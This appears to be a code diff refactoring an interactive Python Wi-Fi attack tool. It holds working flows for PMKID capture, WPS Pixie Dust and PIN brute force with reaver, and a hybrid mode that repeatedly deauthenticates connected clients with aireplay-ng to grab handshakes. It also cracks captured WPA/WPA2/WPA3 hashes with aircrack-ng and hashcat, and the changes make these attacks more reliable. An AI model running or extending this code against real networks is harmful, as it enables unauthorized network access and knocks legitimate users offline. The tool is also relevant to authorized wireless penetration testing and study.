@@ -2,7 +2,6 @@
 
 from __future__ import annotations
 
-import concurrent.futures
 from datetime import datetime
 import os
 from pathlib import Path
@@ -11,21 +10,28 @@ import shutil
 import subprocess
 import threading
 import time
-from concurrent.futures import ThreadPoolExecutor
 
 from rich import box
 from rich.live import Live
 from rich.prompt import Prompt
 from rich.table import Table
 
+from adapters.system_tools import terminate_process
 from app.ui import BORDER_STYLE
 from app.safety import sanitize_filename
+from app.services.runtime_helpers import (
+    ensure_networks_lock,
+    network_is_wpa3,
+    require_selected_network,
+    selected_network_record,
+)
 from attacks.commands import (
     aircrack_check,
     aircrack_crack,
     airodump_capture,
     aireplay_deauth,
     hashcat_crack,
+    hashcat_mode_for_hash_file,
     hcxdumptool_capture,
     hcxpcapngtool_convert,
 )
@@ -40,16 +46,14 @@ from config import DEFAULT_WORDLIST, HANDSHAKE_DIR, ROCKYOU_WORDLIST
 
 def run_pmkid_attack(app) -> None:
     """Run PMKID capture flow."""
-    if not app.selected_network:
-        app.console.print("[bold red]Please select a target network first![/]")
+    record = require_selected_network(app)
+    if not record:
         return
+    bssid, network = record
 
-    network = app.networks[app.selected_network]
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     handshake_dir = HANDSHAKE_DIR
-    if not handshake_dir.exists():
-        app.console.print("[bold yellow]Creating handshake directory...[/]")
-        handshake_dir.mkdir(exist_ok=True)
+    handshake_dir.mkdir(parents=True, exist_ok=True)
 
     safe_ssid = sanitize_filename(network.get("ssid"), fallback="network")
     output_file = handshake_dir / f"pmkid_{safe_ssid}_{timestamp}"
@@ -57,6 +61,9 @@ def run_pmkid_attack(app) -> None:
     output_hash = output_file.with_suffix(".22000")
     pmkid_found = False
     start_time = time.time()
+    last_convert = 0.0
+    convert_interval = 3.0
+    process = None
 
     def create_status_table():
         current_time = time.time()
@@ -76,7 +83,7 @@ def run_pmkid_attack(app) -> None:
 
         status = "[bold green]PMKID Found! (Continuing...)" if pmkid_found else "[info]Capturing..."
         table.add_row(
-            app.selected_network,
+            bssid,
             str(network["channel"]),
             network["ssid"],
             str(len(network["clients"])),
@@ -86,37 +93,38 @@ def run_pmkid_attack(app) -> None:
         return table
 
     try:
+        process = subprocess.Popen(
+            hcxdumptool_capture(app.interface_name, output_pcapng),
+            stdout=subprocess.PIPE,
+            stderr=subprocess.DEVNULL,
+        )
         with Live(refresh_per_second=4) as live:
-            process = subprocess.Popen(
-                hcxdumptool_capture(app.interface_name, output_pcapng),
-                stdout=subprocess.PIPE,
-                stderr=subprocess.DEVNULL,
-            )
-
             while True:
                 live.update(create_status_table())
-                if output_pcapng.exists():
-                    subprocess.run(
-                        hcxpcapngtool_convert(output_hash, output_pcapng),
-                        stdout=subprocess.DEVNULL,
-                        stderr=subprocess.DEVNULL,
-                    )
-                    if output_hash.exists() and output_hash.stat().st_size > 0 and not pmkid_found:
-                        pmkid_found = True
-                        app.logger.info(
-                            f"PMKID captured successfully (continuing). Saved to: {output_hash}",
+                if process.poll() is not None:
+                    app.console.print("\n[warning]hcxdumptool exited unexpectedly.[/]")
+                    break
+                now = time.time()
+                if now - last_convert >= convert_interval:
+                    last_convert = now
+                    if output_pcapng.exists() and output_pcapng.stat().st_size > 0:
+                        subprocess.run(
+                            hcxpcapngtool_convert(output_hash, output_pcapng),
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL,
+                            timeout=60,
                         )
+                        if output_hash.exists() and output_hash.stat().st_size > 0 and not pmkid_found:
+                            pmkid_found = True
+                            app.logger.info(
+                                f"PMKID captured successfully (continuing). Saved to: {output_hash}",
+                            )
                 time.sleep(0.25)
 
     except KeyboardInterrupt:
         app.console.print("\n[bold yellow]PMKID attack stopped by user.[/]")
     finally:
-        if "process" in locals():
-            try:
-                process.terminate()
-                process.wait(timeout=2)
-            except Exception:
-                process.kill()
+        terminate_process(process)
 
         if pmkid_found:
             app.console.print(f"\n[bold green]PMKID attack completed successfully. File saved to: {output_hash}[/]")
@@ -129,12 +137,11 @@ def run_pmkid_attack(app) -> None:
 
 def run_wps_attack(app) -> None:
     """Run WPS Pixie Dust or PIN brute-force flow."""
-    if not app.selected_network:
-        app.console.print("[bold red]Please select a target network first![/]")
+    record = require_selected_network(app)
+    if not record:
         return
-
-    network = app.networks[app.selected_network]
-    if not network["wps"]:
+    bssid, network = record
+    if not network.get("wps"):
         app.console.print("[bold red]Selected network does not have WPS enabled![/]")
         return
 
@@ -146,20 +153,35 @@ def run_wps_attack(app) -> None:
     choice = Prompt.ask("Select an option")
     if choice == "0":
         return
+    if choice not in {"1", "2"}:
+        app.console.print("[bold red]Invalid choice.[/]")
+        return
 
+    process = None
     try:
+        app.command_runner.set_wireless_channel(app.interface_name, network["channel"])
+        cmd = [
+            "reaver",
+            "-i",
+            str(app.interface_name),
+            "-b",
+            bssid,
+            "-c",
+            str(network["channel"]),
+            "-vv",
+        ]
         if choice == "1":
             app.console.print("[bold blue]Starting Pixie Dust attack...[/]")
-            cmd = f"reaver -i {app.interface_name} -b {app.selected_network} -c {network['channel']} -K 1 -vv"
+            cmd.extend(["-K", "1"])
         else:
             app.console.print("[bold blue]Starting PIN brute force...[/]")
-            cmd = f"reaver -i {app.interface_name} -b {app.selected_network} -c {network['channel']} -vv"
 
         process = subprocess.Popen(
-            cmd.split(),
+            cmd,
             stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            universal_newlines=True,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1,
         )
 
         with Live(refresh_per_second=4) as live:
@@ -183,25 +205,22 @@ def run_wps_attack(app) -> None:
                         app.console.print(f"\n[success]WPA password found: {password}[/]")
                         break
 
+    except FileNotFoundError:
+        app.console.print("[bold red]reaver is not installed. Install it with: sudo apt install reaver[/]")
     except KeyboardInterrupt:
         app.console.print("\n[bold yellow]WPS attack stopped by user.[/]")
     finally:
-        if "process" in locals():
-            try:
-                process.terminate()
-                process.wait(timeout=2)
-            except Exception:
-                process.kill()
+        terminate_process(process)
         app.current_menu = "attack"
 
 
 def run_hybrid_attack(app) -> None:
     """Run hybrid attack flow using both handshake and PMKID capture."""
-    if not app.selected_network:
-        app.console.print("[bold red]Please select a target network first![/]")
+    record = require_selected_network(app)
+    if not record:
         return
+    bssid, network = record
 
-    network = app.networks[app.selected_network]
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     safe_ssid = sanitize_filename(network.get("ssid"), fallback="network")
 
@@ -218,16 +237,19 @@ def run_hybrid_attack(app) -> None:
     dump_proc = None
     pmkid_proc = None
     start_time = time.time()
+    last_deauth = 0.0
+    last_convert = 0.0
+    deauth_interval = 8.0
+    convert_interval = 3.0
     final_handshake = None
 
     known_clients = set(network["clients"])
     last_client_check = time.time()
     client_check_interval = 5
     client_lock = threading.Lock()
+    networks_lock = ensure_networks_lock(app)
 
-    is_wpa3 = False
-    if "cipher" in network and "WPA3" in network["cipher"]:
-        is_wpa3 = True
+    is_wpa3 = network_is_wpa3(network)
     security_type = "WPA3" if is_wpa3 else "WPA/WPA2"
 
     def create_status_table():
@@ -249,7 +271,7 @@ def run_hybrid_attack(app) -> None:
         with client_lock:
             status = "[success]Handshake found (continuing)." if handshake_found else "[info]Capturing..."
             table.add_row(
-                app.selected_network,
+                bssid,
                 str(network["channel"]),
                 network["ssid"],
                 str(len(known_clients)),
@@ -264,9 +286,9 @@ def run_hybrid_attack(app) -> None:
         if current_time - last_client_check < client_check_interval:
             return
         last_client_check = current_time
-        with app._networks_lock:
-            if app.selected_network in app.networks:
-                current_clients = set(app.networks[app.selected_network]["clients"])
+        with networks_lock:
+            if bssid in app.networks:
+                current_clients = set(app.networks[bssid]["clients"])
                 with client_lock:
                     new_clients = current_clients - known_clients
                     if new_clients:
@@ -277,14 +299,14 @@ def run_hybrid_attack(app) -> None:
             clients_to_deauth = list(known_clients)
         if clients_to_deauth:
             subprocess.run(
-                aireplay_deauth(app.interface_name, bssid=app.selected_network, count=2),
+                aireplay_deauth(app.interface_name, bssid=bssid, count=2),
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
                 timeout=30,
             )
             for client in clients_to_deauth:
                 subprocess.run(
-                    aireplay_deauth(app.interface_name, bssid=app.selected_network, count=2, client=client),
+                    aireplay_deauth(app.interface_name, bssid=bssid, count=2, client=client),
                     stdout=subprocess.DEVNULL,
                     stderr=subprocess.DEVNULL,
                     timeout=30,
@@ -295,7 +317,7 @@ def run_hybrid_attack(app) -> None:
         if not handshake_found:
             cap_files = list(handshake_dir.glob(f"handshake_{safe_ssid}_{timestamp}*.cap"))
             if cap_files:
-                result = subprocess.run(aircrack_check(cap_files[0]), capture_output=True, text=True)
+                result = subprocess.run(aircrack_check(cap_files[0]), capture_output=True, text=True, timeout=30)
                 if has_aircrack_handshake(result.stdout):
                     handshake_found = True
                     final_handshake = handshake_dir / f"handshake_{safe_ssid}_{timestamp}.cap"
@@ -305,8 +327,13 @@ def run_hybrid_attack(app) -> None:
                         "(continuing until Ctrl+C)",
                     )
 
-        if not pmkid_found and pmkid_pcapng.exists():
-            subprocess.run(hcxpcapngtool_convert(pmkid_hash, pmkid_pcapng), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if not pmkid_found and pmkid_pcapng.exists() and pmkid_pcapng.stat().st_size > 0:
+            subprocess.run(
+                hcxpcapngtool_convert(pmkid_hash, pmkid_pcapng),
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                timeout=60,
+            )
             if pmkid_hash.exists() and pmkid_hash.stat().st_size > 0:
                 pmkid_found = True
                 app.logger.info(
@@ -319,7 +346,7 @@ def run_hybrid_attack(app) -> None:
                 airodump_capture(
                     app.interface_name,
                     channel=network["channel"],
-                    bssid=app.selected_network,
+                    bssid=bssid,
                     output_prefix=handshake_file,
                 ),
                 stdout=subprocess.DEVNULL,
@@ -333,9 +360,17 @@ def run_hybrid_attack(app) -> None:
 
             while True:
                 live.update(create_status_table())
+                if dump_proc.poll() is not None and pmkid_proc.poll() is not None:
+                    app.console.print("\n[warning]Capture processes exited unexpectedly.[/]")
+                    break
                 check_for_new_clients()
-                deauth_all_clients()
-                check_for_handshake()
+                now = time.time()
+                if now - last_deauth >= deauth_interval:
+                    last_deauth = now
+                    deauth_all_clients()
+                if now - last_convert >= convert_interval:
+                    last_convert = now
+                    check_for_handshake()
                 time.sleep(0.25)
 
     except KeyboardInterrupt:
@@ -344,18 +379,8 @@ def run_hybrid_attack(app) -> None:
         else:
             app.console.print("\n[bold yellow]Attack stopped by user. No captures were made.[/]")
     finally:
-        if dump_proc:
-            try:
-                dump_proc.terminate()
-                dump_proc.wait(timeout=2)
-            except Exception:
-                dump_proc.kill()
-        if pmkid_proc:
-            try:
-                pmkid_proc.terminate()
-                pmkid_proc.wait(timeout=2)
-            except Exception:
-                pmkid_proc.kill()
+        terminate_process(dump_proc)
+        terminate_process(pmkid_proc)
 
         for ext in [".csv", ".netxml", "-01.cap"]:
             for f in handshake_dir.glob(f"handshake_{safe_ssid}_{timestamp}*{ext}"):
@@ -406,17 +431,10 @@ def run_capture_handshake(app) -> None:
 
 def run_dictionary_attack(app) -> None:
     """Run dictionary attack for handshake or PMKID files."""
-    if not app.selected_network and not HANDSHAKE_DIR.exists():
-        app.console.print("[bold red]Please select a target network first![/]")
-        return
-
-    network = app.networks[app.selected_network] if app.selected_network else None
-    is_wpa3 = False
-    if network and "security" in network:
-        if isinstance(network["security"], str) and "WPA3" in network["security"]:
-            is_wpa3 = True
-        elif isinstance(network["security"], list) and any("WPA3" in sec for sec in network["security"]):
-            is_wpa3 = True
+    HANDSHAKE_DIR.mkdir(parents=True, exist_ok=True)
+    record = selected_network_record(app)
+    network = record[1] if record else None
+    is_wpa3 = network_is_wpa3(network)
 
     app.console.print("\n[bold yellow]Dictionary Attack:[/]")
     app.console.print("1. Use handshake file")
@@ -428,14 +446,9 @@ def run_dictionary_attack(app) -> None:
     choice = Prompt.ask("Select an option")
     if choice == "0":
         return
+    selected_file = None
     if choice == "1":
         handshake_dir = HANDSHAKE_DIR
-        if not handshake_dir.exists():
-            app.console.print("[bold yellow]Creating handshake directory...[/]")
-            handshake_dir.mkdir(exist_ok=True)
-            app.console.print("[bold red]No handshake files found! Capture a handshake first.[/]")
-            return
-
         handshake_files = list(handshake_dir.glob("*.cap"))
         if not handshake_files:
             app.console.print("[bold red]No handshake files found in 'handshake' directory![/]")
@@ -443,7 +456,7 @@ def run_dictionary_attack(app) -> None:
 
         app.console.print("\n[bold green]Available Handshake Files:[/]")
         for idx, file in enumerate(handshake_files, 1):
-            result = subprocess.run(aircrack_check(file), capture_output=True, text=True)
+            result = subprocess.run(aircrack_check(file), capture_output=True, text=True, timeout=30)
             status = "[green]Valid" if has_aircrack_handshake(result.stdout) else "[red]Invalid"
             app.console.print(f"{idx}. {file.name} - {status}")
 
@@ -455,49 +468,55 @@ def run_dictionary_attack(app) -> None:
             return
 
         selected_file = handshake_files[int(file_choice) - 1]
-        result = subprocess.run(aircrack_check(selected_file), capture_output=True, text=True)
+        result = subprocess.run(aircrack_check(selected_file), capture_output=True, text=True, timeout=30)
         if not has_aircrack_handshake(result.stdout):
             app.console.print("[bold red]Selected file does not contain a valid handshake![/]")
             return
-    elif choice == "2":
+    elif choice == "2" or (choice == "3" and is_wpa3):
         handshake_dir = HANDSHAKE_DIR
-        if not handshake_dir.exists():
-            app.console.print("[bold yellow]Creating handshake directory...[/]")
-            handshake_dir.mkdir(exist_ok=True)
-
-        app.console.print("\n[bold yellow]PMKID File Options:[/]")
-        app.console.print("1. Select from captured PMKID files")
-        app.console.print("2. Specify custom PMKID file path")
+        label = "WPA3 SAE hash" if choice == "3" else "PMKID"
+        app.console.print(f"\n[bold yellow]{label} File Options:[/]")
+        app.console.print(f"1. Select from captured {label} files")
+        app.console.print(f"2. Specify custom {label} file path")
         app.console.print("0. Cancel")
 
-        pmkid_option = Prompt.ask("Choose PMKID option", choices=["0", "1", "2"])
+        pmkid_option = Prompt.ask("Choose file option", choices=["0", "1", "2"])
         if pmkid_option == "0":
             return
         if pmkid_option == "1":
-            pmkid_files = list(handshake_dir.glob("*.22000")) + list(handshake_dir.glob("pmkid_*.pcapng"))
+            pmkid_files = (
+                list(handshake_dir.glob("*.22000"))
+                + list(handshake_dir.glob("*.16800"))
+                + list(handshake_dir.glob("pmkid_*.pcapng"))
+            )
             if not pmkid_files:
-                app.console.print("[bold red]No PMKID files found in 'handshake' directory![/]")
+                app.console.print(f"[bold red]No {label} files found in 'handshake' directory![/]")
                 return
-            app.console.print("\n[bold green]Available PMKID Files:[/]")
+            app.console.print(f"\n[bold green]Available {label} Files:[/]")
             for idx, file in enumerate(pmkid_files, 1):
                 app.console.print(f"{idx}. {file.name}")
             file_choice = Prompt.ask(
-                "\nSelect PMKID file (0 to cancel)",
+                "\nSelect file (0 to cancel)",
                 choices=["0"] + [str(i) for i in range(1, len(pmkid_files) + 1)],
             )
             if file_choice == "0":
                 return
             selected_file = pmkid_files[int(file_choice) - 1]
-            if selected_file.suffix == ".pcapng":
+            if selected_file.suffix.lower() == ".pcapng":
                 output_file = selected_file.with_suffix(".22000")
                 app.console.print("[bold blue]Converting PCAPNG to hashcat format...[/]")
-                subprocess.run(hcxpcapngtool_convert(output_file, selected_file), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                if not output_file.exists() or os.path.getsize(str(output_file)) == 0:
+                subprocess.run(
+                    hcxpcapngtool_convert(output_file, selected_file),
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    timeout=60,
+                )
+                if not output_file.exists() or output_file.stat().st_size == 0:
                     app.console.print("[bold red]Failed to convert PMKID file to hashcat format![/]")
                     return
                 selected_file = output_file
         else:
-            file_path = Prompt.ask("Enter path to PMKID file (absolute or relative path)")
+            file_path = Prompt.ask("Enter path to hash file (absolute or relative path)")
             selected_file = Path(file_path)
             if not selected_file.exists():
                 app.console.print(f"[bold red]File not found: {selected_file}[/]")
@@ -505,13 +524,22 @@ def run_dictionary_attack(app) -> None:
             if selected_file.suffix.lower() == ".pcapng":
                 output_file = selected_file.with_suffix(".22000")
                 app.console.print("[bold blue]Converting PCAPNG to hashcat format...[/]")
-                subprocess.run(hcxpcapngtool_convert(output_file, selected_file), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                if not output_file.exists() or os.path.getsize(str(output_file)) == 0:
+                subprocess.run(
+                    hcxpcapngtool_convert(output_file, selected_file),
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
+                    timeout=60,
+                )
+                if not output_file.exists() or output_file.stat().st_size == 0:
                     app.console.print("[bold red]Failed to convert PMKID file to hashcat format![/]")
                     return
                 selected_file = output_file
     else:
         app.console.print("[bold red]Invalid choice.[/]")
+        return
+
+    if selected_file is None:
+        app.console.print("[bold red]No hash file selected.[/]")
         return
 
     app.console.print("\n[bold yellow]Select Wordlist:[/]")
@@ -569,7 +597,7 @@ def run_dictionary_attack(app) -> None:
     essid = None
     is_wpa3 = False
     try:
-        aircrack_result = subprocess.run(aircrack_check(selected_file), capture_output=True, text=True)
+        aircrack_result = subprocess.run(aircrack_check(selected_file), capture_output=True, text=True, timeout=30)
         network_info = parse_aircrack_network_info(aircrack_result.stdout)
         if network_info:
             bssid = network_info.bssid
@@ -582,14 +610,13 @@ def run_dictionary_attack(app) -> None:
         app.logger.error(f"Error extracting network info: {str(exc)}")
 
     uses_hashcat = False
-    if choice == "2":
+    if choice in {"2", "3"}:
         uses_hashcat = True
-        cmd = hashcat_crack(selected_file, wordlist, mode=16800, workload=3, force=True)
-        app.console.print("[bold blue]Using hashcat for PMKID cracking (mode 16800)[/]")
+        hash_mode = hashcat_mode_for_hash_file(selected_file)
+        cmd = hashcat_crack(selected_file, wordlist, mode=hash_mode, workload=3, force=True)
+        app.console.print(f"[bold blue]Using hashcat for hash cracking (mode {hash_mode})[/]")
     else:
         # Avoid forcing ESSID: malformed/ambiguous ESSID parsing can block valid cracks.
-        # This mirrors the known working manual command:
-        # aircrack-ng <capture.cap> -w <wordlist>
         cmd = aircrack_crack(selected_file, wordlist, None)
         app.console.print("[bold blue]Using aircrack-ng for dictionary attack[/]")
 
@@ -716,23 +743,4 @@ def run_dictionary_attack(app) -> None:
         app.console.print(f"\n[bold red]Error during dictionary attack: {str(exc)}[/]")
         app.logger.error(f"Error during dictionary attack: {str(exc)}")
     finally:
-        if process:
-            try:
-                process.terminate()
-                try:
-                    process.wait(timeout=2)
-                except subprocess.TimeoutExpired:
-                    process.kill()
-                    try:
-                        process.wait(timeout=2)
-                    except Exception:
-                        pass
-            except Exception:
-                pass
-        try:
-            if uses_hashcat:
-                subprocess.run(["pkill", "-9", "-f", "hashcat"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            else:
-                subprocess.run(["pkill", "-9", "-f", "aircrack-ng"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except Exception:
-            pass
+        terminate_process(process)
